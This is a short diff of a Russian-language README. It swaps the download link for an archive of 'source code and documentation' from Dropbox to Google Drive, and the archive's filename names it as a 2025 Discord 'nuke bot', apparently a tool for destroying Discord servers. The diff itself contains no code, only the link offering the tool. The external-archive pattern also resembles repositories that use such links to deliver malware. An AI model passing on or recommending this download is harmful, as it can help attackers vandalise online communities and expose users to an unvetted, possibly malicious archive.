@@ -1,7 +1,7 @@
 
 
 Более подробная информация — в архиве:  
-📎 [Скачать архив с исходным кодом и документацией](https://www.dropbox.com/scl/fi/w44t1hgvik7e28vkr3t4a/new-nuke-bots-discord-2025-main-1.zip?rlkey=mrk1vp9qavsb2b4zjggio4tzs&st=tgquyicu&dl=0)
+📎 [Скачать архив с исходным кодом и документацией](https://drive.google.com/file/d/1fL9_hyUFNQLMQwYJ-91zpE2-wSxTfH1V/view?usp=sharing)
 
 
 ### О проекте
